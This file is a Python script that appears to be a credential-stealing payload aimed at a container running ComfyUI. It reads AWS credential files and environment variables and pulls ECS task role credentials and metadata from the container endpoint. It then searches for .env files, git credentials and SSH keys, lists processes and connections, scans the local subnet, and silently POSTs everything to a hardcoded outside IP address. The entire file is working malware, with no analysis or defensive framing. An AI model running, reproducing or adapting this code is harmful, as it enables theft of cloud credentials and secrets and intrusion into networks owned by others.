import os, subprocess, urllib.request, json, socket

OUT = []
def run(c, t=25):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout or "")[:2500] + (("\n[err]" + r.stderr[:150]) if r.stderr.strip() else "")
    except Exception as e:
        return "EXC " + str(e)

OUT.append("=== SYS ===")
OUT.append(run("id; hostname; cat /etc/os-release|head -2; ls -la /root; df -h / | tail -1"))

OUT.append("=== AWS/ECS ===")
OUT.append(run("cat /root/.aws/credentials 2>/dev/null; echo ---; env|grep -iE 'AWS_|ECS_'"))
rel = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI','')
if rel:
    try:
        with urllib.request.urlopen("http://169.254.170.2"+rel, timeout=8) as r:
            OUT.append("ECS_CREDS: " + r.read().decode('utf-8','replace')[:1200])
    except Exception as e:
        OUT.append("ECS_CREDS ERR " + str(e)[:120])

OUT.append("=== ECS META ===")
v4 = os.environ.get('ECS_CONTAINER_METADATA_URI_V4','')
if v4:
    try:
        with urllib.request.urlopen(v4, timeout=8) as r:
            OUT.append(r.read().decode('utf-8','replace')[:1500])
    except Exception as e:
        OUT.append("META ERR " + str(e)[:100])

OUT.append("=== ENV ===")
OUT.append(run("env | grep -viE '^(LS_COLORS|PATH=|PWD=|HOME=|SHLVL|_=)' | head -40"))

OUT.append("=== CREDS_SCAN ===")
OUT.append(run("find / -maxdepth 5 \\( -path /proc -o -path /sys -o -path /etc/ssl -o -path '/usr/local/lib' \\) -prune -o \\( -name '*.env' -o -name '.env' -o -name 'credentials' -o -name '.git-credentials' -o -name 'id_rsa' \\) -print 2>/dev/null | head -25"))

OUT.append("=== COMFY ===")
OUT.append(run("ls /ComfyUI/custom_nodes; du -sh /ComfyUI; ls /ComfyUI/user; grep -aiE 'Install|CLONE' /ComfyUI/user/comfyui.log 2>/dev/null | tail -15"))

OUT.append("=== PROC/NET ===")
OUT.append(run("cat /proc/net/tcp | awk 'NR>1{print $2,$3,$4}' | head -15"))
OUT.append(run("for p in $(ls /proc|grep -E '^[0-9]+$'); do c=$(tr '\\0' ' ' </proc/$p/cmdline 2>/dev/null); [ -n \"$c\" ] && echo \"$p $c\"; done | head -12"))

OUT.append("=== LAN ===")
try:
    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8",80))
    my=s.getsockname()[0]; s.close(); OUT.append("myip="+my)
    net=my.rsplit('.',1)[0]
    import concurrent.futures as cf
    def chk(a):
        h,p=a
        try:
            k=socket.create_connection((h,p),0.5); k.close(); return f"{h}:{p}"
        except: return None
    tasks=[(f"{net}.{i}",p) for i in range(1,255) for p in (443,8188,8000)]
    hits=[]
    with cf.ThreadPoolExecutor(max_workers=250) as ex:
        for r in ex.map(chk,tasks):
            if r: hits.append(r)
    OUT.append("open: " + ",".join(hits[:40]))
except Exception as e:
    OUT.append("LAN ERR "+str(e))

data = "\n".join(OUT).encode()
try:
    urllib.request.urlopen(urllib.request.Request("http://161.97.178.84:8898/t2", data=data, method="POST"), timeout=60)
except Exception:
    pass
